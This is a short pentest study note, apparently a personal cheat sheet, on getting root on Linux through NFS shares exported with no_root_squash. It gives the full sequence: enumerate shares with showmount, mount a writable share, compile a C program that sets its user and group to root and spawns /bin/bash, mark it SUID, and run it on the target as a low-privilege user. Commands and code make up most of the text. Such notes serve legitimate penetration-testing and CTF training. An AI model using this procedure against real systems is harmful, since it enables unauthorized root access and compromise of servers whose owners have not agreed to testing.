#LinuxPrivEsc 
Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system

NFS (Network File Sharing) configuration is kept in the `/etc/exports` file. This file is created during the NFS server installation and can usually be read by users

![[NFS.JPG]]
The critical part is the *no_root_squash* option. By default, NFS will change the root client user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

 >!Important:  for this privesc vector to work, the attacker must use the root user on their client machine

1. Start by enumerating mountable shares from the client machine on the server machine
		`showmount -e server_ip`
  2. We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable
		`mkdir /tmp/random_dir`
		`mount -o rw server_ip:/vulnerable_share /tmp/random_dir`
  3. Create a simple executable that will run /bin/bash on the target system. Assign this the SUID bits
```C
#include <unistd.h>
int main(){
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
``` 
		`gcc nfs.c -o nfs -w`
		`chmod +s nfs`
4. Since the nfs executable was created in the mounted share, it will be present in the target system. Just execute this will a low privilege user and obtain root owo